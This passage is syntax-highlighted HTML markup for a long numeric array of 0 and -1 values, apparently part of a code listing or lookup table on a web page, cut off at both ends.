class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 